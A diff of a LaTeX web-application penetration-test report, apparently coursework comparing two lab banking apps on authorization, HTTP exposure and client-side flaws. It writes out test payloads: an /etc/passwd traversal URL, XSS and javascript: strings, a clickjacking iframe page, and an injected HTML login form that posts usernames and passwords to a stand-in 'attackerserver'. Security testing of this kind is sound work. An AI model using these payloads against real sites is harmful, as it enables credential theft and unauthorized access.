@@ -510,13 +510,142 @@ We could not find an alternative channel for authentication. Therefore, we decid
 \section{Authorization Testing}
 
 \subsection{Testing Directory traversal/file include}
-TODO!
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the HTTP Methods, to find possible places for directory traversal. We observed HTTP Post and Get Methods and looked for any file requests to the server.  \\
+\textbf{Discovery} & We Could not find this vulnerability since the application does not load content from any file from the server. We tried putting the following request at various webpage of application. http://192.168.56.101/InternetBanking?item=../../../../etc/passwd, However we couldnt find any vulnerability \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the HTTP Methods, to find possible places for directory traversal. We observed HTTP Post and Get Methods and looked for any file requests to the server.  \\
+\textbf{Discovery} & We Could not find this vulnerability since the application does not load content from any file from the server. We tried putting the following request at various webpage of application. http://192.168.56.101/Seccoding-2015?item=../../../../etc/passwd, However we couldnt find any vulnerability \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Comparision}
+Both the applications did not have this vulnerability
 \subsection{Testing for bypassing authorization schema}
-TODO!
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the WebPages in the APP.We searched for hidden parameters in the request, in order to find a loop hole and bypass the authorization schema. We looked at those pages which could exclusively be accessed by the admin, or the employee. We tried acessing those pages by giving direct url link, when logged in as the other user. However we were not able to bypass the Authorization Schema. We got a message like 'Not an Employee'  \\
+\textbf{Discovery} & We Could not find this vulnerability . We got appropriate message when trying to bypass authorization schema \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the WebPages in the APP.We searched for hidden parameters in the request in order to find a loophole and bypass the authorization schema. We looked at those pages which could exclusively be accessed by the admin, or the employee. We tried acessing those pages by giving direct url link, when logged in as the other user. However we were not able to bypass the Authorization Schema. We got a message like ' You are not Authenticated to do this  \\
+\textbf{Discovery} & We Could not find this vulnerability . We got appropriate message when trying to bypass authorization schema \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+\subsubsection{Comparision}
+Both the applications did not have this vulnerability
 \subsection{Testing for Privilege Escalation}
-TODO!
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the WebPages in the APP. We looked at those pages which could exclusively be accessed by the admin, or the employee. We tried accessing pages like approve transfers and approve transfers as client, However we were not able to access it. We got a message like 'Not an Employee'  \\
+\textbf{Discovery} & We Could not find this vulnerability . We got appropriate message when trying for privilege escalation \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the WebPages in the APP. We looked at those pages which could exclusively be accessed by the admin, or the employee. We tried acessing those pages by giving direct url link, when logged in as the other user. However we were not able to perform privilege escalation. We got a message like ' You are not Authenticated to do this  \\
+\textbf{Discovery} & We Could not find this vulnerability . We got appropriate message when trying for privilege escalation \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+\subsubsection{Comparision}
+Both the applications did not have this vulnerability
 \subsection{Testing for Insecure Direct Object References}
-TODO!
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze all the direct object references, however we couldnt find any vulnerability  \\
+\textbf{Discovery} & We Could not find this vulnerability. \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to Analyze All the direct object references. However we couldnt find any vulnerability  \\
+\textbf{Discovery} & We Could not find this vulnerability . \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+\subsubsection{Comparision}
+Both the applications did not have this vulnerability
 
 \section{Session Management Testing}
 TODO!
@@ -624,7 +753,7 @@ TODO!
 \textbf{User Interaction} & None \\
 \textbf{Scope} & Unchanged \\
 \textbf{Confidentiality} & No Impact \\
-\textbf{Intigrity} & No Impact \\
+\textbf{Integrity} & No Impact \\
 \textbf{Availability} & No Impact \\
 \end{tabular}
 
@@ -635,11 +764,327 @@ Although the Online Banking application produces an error message about a databa
 We were not able to produce stack traces in both applications using invalid inputs (e.g. negative numbers), or SQL injection.
 
 \section{Testing for weak Cryptography}
-TODO!
 
+\subsection{Testing for sensitive information sent over http}
+
+\subsubsection{Online Banking}
+\begin{tabular}{l|p{10cm}}
+
+\textbf{Observation} &  We observed the information transported while performing transactions where not secure. We used Burp to find out that sensitive information like account numbers of the receiver could easily be tapped into. \\
+\textbf{Discovery} & Using Burp We could intercept the transaction request and manipulate the account number to send the money to some other account. \\
+\textbf{Impact} & It can have a very serious security Impact. A user`s money could be sent to an account which he did not intend to send \\
+\textbf{Likelihood} & Medium \\
+\textbf{Access Vector} & local \\
+\textbf{Access Complexity} & High \\
+\textbf{Privileges Required} & None \\
+\textbf{User Interaction} & high \\
+\textbf{Scope} & Unchanged \\
+\textbf{Confidentiality} & High \\
+\textbf{Integrity} & High \\
+\textbf{Availability} & No Impact \\
+\end{tabular}
+
+\subsubsection*{SecureBank}
+\begin{tabular}{l|p{10cm}}
+
+\textbf{Observation} & We found the same vulnerability in secure bank as well \\
+\textbf{Discovery} & By using Burp we could intercept the transaction request and change the sensitive information like account number of the receiver \\
+\textbf{Impact} & High Insecure \\
+\textbf{Likelihood} & Medium \\
+\textbf{Access Vector} & local \\
+\textbf{Access Complexity} & Low \\
+\textbf{Privileges Required} & None \\
+\textbf{User Interaction} & high \\
+\textbf{Scope} & Unchanged \\
+\textbf{Confidentiality} & High \\
+\textbf{Integrity} & High \\
+\textbf{Availability} & No Impact \\
+\end{tabular}
+
+\subsubsection*{Comparison}
+Both Online Banking and Secure Banking have this vulnerability.
 \section{Business Logic Testing}
 TODO!
 
 \section{Client Side Testing}
-TODO!
+\subsection{Testing for DOM based Cross Site Scripting}
 
+\subsubsection*{Online Bank}
+\begin{tabular}{l|p{10cm}}
+
+\textbf{Observation} & We Observed the webpages of the application using Firebug tool to find that the application uses Jquery API for its various frontend functionalities. We could find a bug which was not handled by the Application developers \\
+\textbf{Discovery} & In the Tan field we gave this input #<script>alert('hello'</script. On clicking Submit, We found that the application returned Database error which was not handled by it.\\
+\textbf{Impact} & Low \\
+\textbf{Likelihood} & Low \\
+\textbf{Access Vector} & Medium \\
+\textbf{Access Complexity} & Low \\
+\textbf{Privileges Required} & None \\
+\textbf{User Interaction} & Low \\
+\textbf{Scope} & Unchanged \\
+\textbf{Confidentiality} & Low \\
+\textbf{Integrity} & Low \\
+\textbf{Availability} & High \\
+\end{tabular}
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+
+\textbf{Observation} & We used FireBug in Mozilla to analyse the webpages of the application. We did not come across any active javascript content in the pages.  \\
+\textbf{Discovery} & We tried appending <script>alert('xss')</script> to the URL of client webpages however we couldnt find any vulnerability \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection*{Comparison}
+Online Banking needs to handle this scenario, whereas we couldnt find any such vulnerability in Secure Bank.
+
+\subsection{Testing for Javascript execution}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used FireBug in Mozilla to analyse the webpages of the application. We did not come across any active javascript content in the pages.  \\
+\textbf{Discovery} & We tried appending javascript:alert(1) to the URL of client various webpages however we could not inject any javascript successfully \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used FireBug in Mozilla to analyse the webpages of the application. We did not come across any active javascript content in the pages.  \\
+\textbf{Discovery} & We tried appending javascript:alert(1) to the URL of client various webpages however we could not inject any javascript successfully \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Comparision}
+Both the applications did not have this vulnerability
+\subsection{Testing for HTML Injection}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to analyse all the HTTP requests and looked thorugh various places where we could inject html code.We were looking at various http parameters which we could target. and we could successfully inject HTML code  \\
+\textbf{Discovery} & We put the following HTML code in the receipt field of perform transaction form. And we got the output as a form asking user for his credentials. This could trap the User into entering his credentials which could be redirected as per the attackers choice
+<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
+name="password" /><br /><input type="submit" value="Login" /></form><!-- \\
+\textbf{Impact} &  High\\
+\textbf{Likelihood} & Low \\
+\textbf{Access Vector} &  Local\\
+\textbf{Access Complexity} & Low \\
+\textbf{Privileges Required} & Low \\
+\textbf{User Interaction} & None \\
+\textbf{Scope} & No \\
+\textbf{Confidentiality} & High \\
+\textbf{Integrity} & None \\
+\textbf{Availability} & None \\
+\end{tabular}
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used Burp to analyse all the HTTP requests and looked thorugh various places where we could inject html code.We were looking at various http parameters which we could target. and we could successfully inject HTML code  \\
+\textbf{Discovery} & We put the following HTML code at various fields to find the same vulnerability in Secure Bank. However we could not find any such vulnerability in secure bank.
+<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
+name="password" /><br /><input type="submit" value="Login" /></form><!-- \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} &  n/a\\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+\subsubsection{Comparision}
+We could conclude that Online Bank Application was vulnerable to HTML Injection while Secure Bank was not vulnerable.
+
+\subsection{Testing for Client Side URL redirect}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used FireBug in Mozilla to analyse the possibilities of crating a fake url. However we couldnt find one  \\
+\textbf{Discovery} & We tried this String URL as input 192.168.56.101/Internet-Banking/?#www.gmail.com to various input fields including the URL but didnt found any vulnerability \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} &  We used FireBug in Mozilla to analyse the possibilities of crating a fake url. However we couldnt find one \\
+\textbf{Discovery} & We tried this String URL as input 192.168.56.101/Internet-Banking/?#www.gmail.com to various input fields including the URL but didnt found any vulnerability \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Comparision}
+Both The Applications donot have this vulnerability
+
+\subsection{Testing for CSS Injection}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used FireBug in Mozilla to analyse the CSS Code for all webpages of this application.   \\
+\textbf{Discovery} & We could not find any possible places to inject a CSS code. \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} &  We used FireBug in Mozilla to analyse the CSS Code for all webpages of this application  \\
+\textbf{Discovery} & We could not find any possible places to inject a CSS code \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Comparision}
+Both The Applications donot have this vulnerability
+
+\subsection{Testing for click jacking}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We test for click jacking by encapsulating the Web Application URL inside an iframe and to check whether the webpage content is shown properly   \\
+\textbf{Discovery} & We made a new webpage with the following source code
+<html>
+   <head>
+     <title>Clickjack test page</title>
+   </head>
+   <body>
+     <p>Website is vulnerable to clickjacking!</p>
+     <iframe src="http://192.168.56.101/InternetBanking" width="500" height="500"></iframe>
+   </body>
+</html>
+We got the Output as Website is vulnerable to clickjacking
+ \\
+\textbf{Impact} &  High\\
+\textbf{Likelihood} & Low \\
+\textbf{Access Vector} & Local \\
+\textbf{Access Complexity} &  Low\\
+\textbf{Privileges Required} & None \\
+\textbf{User Interaction} & High \\
+\textbf{Scope} & Unchanged \\
+\textbf{Confidentiality} & None \\
+\textbf{Integrity} & High \\
+\textbf{Availability} &  \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We test for click jacking by encapsulating the Web Application URL inside an iframe and to check whether the webpage content is shown properly   \\
+\textbf{Discovery} & We made a new webpage with the following source code
+<html>
+   <head>
+     <title>Clickjack test page</title>
+   </head>
+   <body>
+     <p>Website is vulnerable to clickjacking!</p>
+     <iframe src="http://192.168.56.101/InternetBanking" width="500" height="500"></iframe>
+   </body>
+</html>
+We got the Output as Website is vulnerable to clickjacking
+ \\
+\textbf{Impact} &  High\\
+\textbf{Likelihood} & Low \\
+\textbf{Access Vector} & Local \\
+\textbf{Access Complexity} &  Low\\
+\textbf{Privileges Required} & None \\
+\textbf{User Interaction} & High \\
+\textbf{Scope} & Unchanged \\
+\textbf{Confidentiality} & None \\
+\textbf{Integrity} & High \\
+\textbf{Availability} &  \\
+\end{tabular}
+
+\subsubsection{Comparision}
+Both The Applications have this vulnerability
+
+\subsection{Testing WebSockets}
+\subsubsection{Online Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} & We used FireBug in Mozilla to analyse the whether we have any .ws or .wss component in the client souce code of the application   \\
+\textbf{Discovery} & We could not find any .ws or .wss component \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsubsection{Secure Bank}
+\begin{tabular}{l|p{10cm}}
+\textbf{Observation} &  We used FireBug in Mozilla to analyze whether we have any .ws or .wss component in the client souce code of the application  \\
+\textbf{Discovery} & We could not find any .ws or .wss component \\
+\textbf{Impact} &  n/a\\
+\textbf{Likelihood} & n/a \\
+\textbf{Access Vector} & n/a \\
+\textbf{Access Complexity} & n/a \\
+\textbf{Privileges Required} & n/a \\
+\textbf{User Interaction} & n/a \\
+\textbf{Scope} & n/a \\
+\textbf{Confidentiality} & n/a \\
+\textbf{Integrity} & n/a \\
+\textbf{Availability} & n/a \\
+\end{tabular}
+
+\subsection{Test WebMessaging}
+WebMessaging is not implemented in either of the applications , thus we are not testing for it.
+
+\subsection{Testing for Cross Site Flashing}
+Since both The Applications do not use Flash, Thus we donot test for this vulnerability
